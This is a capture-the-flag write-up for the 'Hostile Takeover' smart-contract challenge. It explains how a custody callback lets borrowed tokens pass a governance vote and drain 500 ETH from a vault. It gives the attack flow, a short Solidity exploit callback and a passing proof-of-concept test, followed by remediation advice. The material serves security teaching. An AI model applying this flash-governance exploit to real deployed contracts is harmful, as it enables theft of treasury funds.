# Hostile Takeover — Security Writeup

| | |
|---|---|
| **Challenge** | [SCH Bonus 11 — Hostile Takeover](https://smartcontractshacking.com/tools/web3-ctf-challenges/sch-hostile-takeover) |
| **Platform** | Smart Contracts Hacking (SCH Original) |
| **Targets** | `CivicToken`, `CivicVault`, `CivicCustody`, `CivicCouncil` |
| **Solidity** | `0.8.0` (SCH) / `^0.8.0` locally |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`CivicCustody.checkout` hands CVC to a contract and calls `receiveCustody` before checking that custody was restored. During that window the attacker still holds **2,000,000 / 6,000,000** of supply. `CivicCouncil.propose` snapshots that balance as immutable proposal votes (`> 25%`). Returning the tokens satisfies custody, then `execute` drains **500 ETH** from `CivicVault` to the player.

**Impact:** hostile governance takeover + full treasury drain without permanently stealing CVC.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Vault ETH → player | `vault.balance == 0`, player gained 500 ETH |
| 2 | Custody CVC unchanged | `token.balanceOf(custody)` same as start |

---

## Finding

### [C-01] Flash governance via custody callback

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Read-only / callback governance attack; CEI across modules |
| **Location** | `CivicCustody.checkout` + `CivicCouncil.propose` |
| **CWE** | [CWE-841](https://cwe.mitre.org/data/definitions/841.html) |
| **SWC** | [SWC-107](https://swcregistry.io/docs/SWC-107) (callback reentrancy class) |

#### Why the threshold is met

```
votes = 2_000_000e18
totalSupply / 4 = 1_500_000e18
votes > totalSupply/4  →  true
```

#### Proof of concept

```bash
cd web3-ctf-challenges/11-sch-hostile-takeover
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 980277)
```

---

## Attack scenario

```
Player
  └─ new TakeoverHelper
  └─ helper.attack()
        custody.checkout(2M)
          transfer 2M → helper
          helper.receiveCustody(2M)
            propose(player, 500 ETH)  // snapshot votes = 2M
            transfer 2M → custody
          require custody restored ✓
        council.execute(id)
          vault.sendPayment(player, 500 ETH)
```

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Deploy helper implementing `receiveCustody` |
| **2. Call** | `checkout` → propose inside callback → `execute` |
| **3. Result** | Player has vault ETH; custody CVC unchanged |
| **4. Cost** | Gas only (no CVC capital) |
| **5. ROI** | 500 ETH |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

See repo root `Exploit.s.sol`. Core callback:

```solidity
function receiveCustody(uint256 amount) external {
    require(msg.sender == address(custody), "only custody");
    proposalId = council.propose(player, address(vault).balance);
    require(token.transfer(address(custody), amount), "return failed");
}
```

Call `attack()` **after** construction (`code.length` must be non-zero for checkout).

---

## Remediation

1. Disallow governance / snapshot side effects while tokens are checked out.
2. Bind voting power to locked stake, not flash balances.
3. Prefer pull payments and CEI within each module; treat callbacks as untrusted.

---

## Key lessons

1. **Restitution checks do not undo side effects** performed during the flash window.
2. **Governance + flash liquidity = hostile takeover** if votes use live balances.
3. **Read the whole protocol** — the bug spans custody and council.

---

## References

- [SCH Hostile Takeover](https://smartcontractshacking.com/tools/web3-ctf-challenges/sch-hostile-takeover)
- Local: `Exploit.s.sol`, `test/HostileTakeoverExploit.t.sol`
